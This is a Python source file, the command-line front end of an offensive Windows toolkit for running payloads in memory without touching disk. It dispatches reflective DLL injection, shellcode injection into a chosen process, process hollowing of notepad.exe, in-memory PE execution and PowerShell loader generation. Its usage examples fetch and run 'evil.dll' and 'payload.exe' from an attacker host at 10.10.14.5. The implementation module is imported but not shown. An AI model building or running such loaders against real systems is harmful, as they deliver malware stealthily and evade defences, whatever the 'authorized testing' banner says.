#!/usr/bin/env python3
"""
Memory-Only Execution Toolkit - Main Entry Point
Command-line interface for memory-only execution techniques
"""

import sys
import os
import argparse
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from memory_executor import MemoryExecutor


def print_banner():
    """Print tool banner"""
    banner = """
╔══════════════════════════════════════════════════════════════╗
║         Memory-Only Execution Toolkit                        ║
║         Execute Payloads Without Touching Disk               ║
╚══════════════════════════════════════════════════════════════╝

[*] Techniques Available:
    1. Reflective DLL Loading
    2. Shellcode Injection
    3. Process Hollowing
    4. In-Memory PE Execution
    5. PowerShell Reflective Loading

[!] For authorized security testing only
[!] Operating system: Windows (x64)
"""
    print(banner)


def main():
    """Main entry point for the application"""
    
    parser = argparse.ArgumentParser(
        description="Memory-Only Execution Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Inject DLL from URL into current process
  python main.py --dll-inject http://10.10.14.5/evil.dll

  # Inject shellcode into PID 1234
  python main.py --shellcode fc4883e4f0e8... --pid 1234

  # Process hollowing with notepad
  python main.py --hollow C:\\Windows\\System32\\notepad.exe payload.exe

  # Execute PE from memory
  python main.py --execute-pe http://10.10.14.5/payload.exe

  # Generate PowerShell loader
  python main.py --generate-ps http://10.10.14.5/payload.bin loader.ps1
        """
    )
    
    # Technique selection
    technique_group = parser.add_mutually_exclusive_group(required=True)
    
    technique_group.add_argument(
        '--dll-inject',
        type=str,
        metavar='URL',
        help='Reflective DLL injection from URL'
    )
    
    technique_group.add_argument(
        '--shellcode',
        type=str,
        metavar='HEX',
        help='Shellcode injection (hex-encoded)'
    )
    
    technique_group.add_argument(
        '--hollow',
        nargs=2,
        metavar=('TARGET_EXE', 'PAYLOAD_FILE'),
        help='Process hollowing'
    )
    
    technique_group.add_argument(
        '--execute-pe',
        type=str,
        metavar='URL',
        help='Execute PE from URL'
    )
    
    technique_group.add_argument(
        '--generate-ps',
        nargs=2,
        metavar=('PAYLOAD_URL', 'OUTPUT_FILE'),
        help='Generate PowerShell reflective loader'
    )
    
    # Optional arguments
    parser.add_argument(
        '--pid',
        type=int,
        metavar='PID',
        help='Target process ID (for shellcode injection)'
    )
    
    parser.add_argument(
        '--version',
        action='version',
        version='Memory-Only Execution Toolkit v1.0.0'
    )
    
    # Parse arguments
    args = parser.parse_args()
    
    # Print banner
    print_banner()
    
    # Initialize executor
    executor = MemoryExecutor()
    
    # Execute requested technique
    success = False
    
    if args.dll_inject:
        success = handle_dll_inject(executor, args.dll_inject)
    
    elif args.shellcode:
        success = handle_shellcode(executor, args.shellcode, args.pid)
    
    elif args.hollow:
        success = handle_hollow(executor, args.hollow[0], args.hollow[1])
    
    elif args.execute_pe:
        success = handle_execute_pe(executor, args.execute_pe)
    
    elif args.generate_ps:
        success = handle_generate_ps(executor, args.generate_ps[0], args.generate_ps[1])
    
    return 0 if success else 1


def handle_dll_inject(executor, dll_url):
    """Handle reflective DLL injection"""
    print(f"\n[*] Technique: Reflective DLL Injection")
    print(f"[*] Target: Current Process")
    print()
    
    return executor.reflective_dll_injection(dll_url)


def handle_shellcode(executor, shellcode_hex, target_pid):
    """Handle shellcode injection"""
    print(f"\n[*] Technique: Shellcode Injection")
    
    if target_pid:
        print(f"[*] Target: PID {target_pid}")
    else:
        print(f"[*] Target: Current Process")
    
    print()
    
    return executor.inject_shellcode(shellcode_hex, target_pid)


def handle_hollow(executor, target_exe, payload_file):
    """Handle process hollowing"""
    print(f"\n[*] Technique: Process Hollowing")
    print(f"[*] Target Executable: {target_exe}")
    print(f"[*] Payload File: {payload_file}")
    print()
    
    # Read payload file
    try:
        with open(payload_file, 'rb') as f:
            payload_data = f.read()
    except FileNotFoundError:
        print(f"[!] Payload file not found: {payload_file}")
        return False
    except Exception as e:
        print(f"[!] Failed to read payload: {e}")
        return False
    
    return executor.process_hollowing(target_exe, payload_data)


def handle_execute_pe(executor, pe_url):
    """Handle in-memory PE execution"""
    print(f"\n[*] Technique: In-Memory PE Execution")
    print(f"[*] PE URL: {pe_url}")
    print()
    
    return executor.execute_pe_from_memory(pe_url)


def handle_generate_ps(executor, payload_url, output_file):
    """Handle PowerShell script generation"""
    print(f"\n[*] Technique: PowerShell Reflective Loader Generation")
    print(f"[*] Payload URL: {payload_url}")
    print(f"[*] Output File: {output_file}")
    print()
    
    return executor.generate_powershell_reflective_loader(payload_url, output_file)


if __name__ == "__main__":
    if os.name != 'nt':
        print("[!] Warning: This tool is designed for Windows systems")
        print("[!] Some features may not work on other platforms")
        print()
    
    sys.exit(main())